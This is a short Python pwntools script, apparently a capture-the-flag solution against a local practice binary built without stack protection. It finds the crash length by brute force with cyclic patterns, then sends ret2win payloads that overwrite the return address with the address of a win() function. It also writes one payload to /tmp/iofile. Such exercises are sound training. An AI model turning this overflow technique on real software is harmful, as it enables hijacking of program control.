from pwn import *
 
# -fno-stack-protector
FILENAME = 'a.out'
#FILENAME = './tranquil'

## Bruteforce length ######################
length = 0
for i in range(1,100):
    payload = cyclic(i)
    io = process(FILENAME)
    io.sendline(payload)
    io.sendline('')
    print(io.recv())
    io.wait()
    exit_code = io.poll()
    #print(exit_code)
    if exit_code == -11:
        length = i
        break
    
print(length)
e = ELF(FILENAME)
log.info("Address of win(): 0x{:02X}".format(e.symbols["win"]))
for offset in range(length-16, length+16+1):
    p = process(FILENAME)
    if offset ==length-3:
        with open('/tmp/iofile', 'wb') as f:
            f.write(fit({offset: e.symbols["win"]}))
    payload = fit({offset: e.symbols["win"]})
    print(payload)
    p.sendline(payload)
    print(p.recv(timeout =1))
